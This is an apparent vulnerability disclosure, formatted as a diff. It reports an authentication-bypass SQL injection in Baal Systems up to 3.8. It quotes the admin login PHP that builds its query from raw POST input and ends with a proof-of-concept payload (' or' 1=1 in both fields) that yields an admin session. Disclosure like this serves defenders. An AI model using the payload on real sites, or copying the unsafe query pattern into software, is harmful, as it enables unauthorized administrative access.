@@ -1,0 +1,48 @@
+[+] Baal Systems <= 3.8 (Auth Bypass) SQL Injection Vulnerability
+[+] Discovered by cr4wl3r <cr4wl3r[!]linuxmail.org>
+
+[+] Vuln Code : 
+
+[adminlogin.php]
+
+<?php
+include("common.php");
+if (!empty($_POST['password'])) {
+	$username = $_POST['username'];
+    $password = $_POST['password'];
+
+    $query = "select * from {$tableprefix}tbluser where username='" . $username . "' and password='" . $password . "' and userrole='admin';";
+    $result1 = db_query($query);
+    $rows = db_num_rows($result1);
+    $row = db_fetch_array($result1);
+    if ($rows != 0) {
+        if (session_is_registered("whossession")) {
+            $_SESSION['who'] = "admin";
+            $_SESSION['userrole'] = "admin";
+            $_SESSION['username'] = $username;
+            $_SESSION['usernum'] = $row["userid"];
+            header("location:admin.php");
+        } else {
+            session_register("whossession");
+            $_SESSION['who'] = "admin";
+            $_SESSION['userrole'] = "admin";
+            $_SESSION['username'] = $username;
+            $_SESSION['usernum'] = $row["userid"];
+            header("location:admin.php");
+        } 
+    } else {
+        header("location:adminlogin.php?error=yes");
+    } 
+} else {
+
+    ?>
+
+[+] PoC : 
+
+[BaalSystems_path]/adminlogin.php
+
+
+username: ' or' 1=1
+Password: ' or' 1=1
+
+
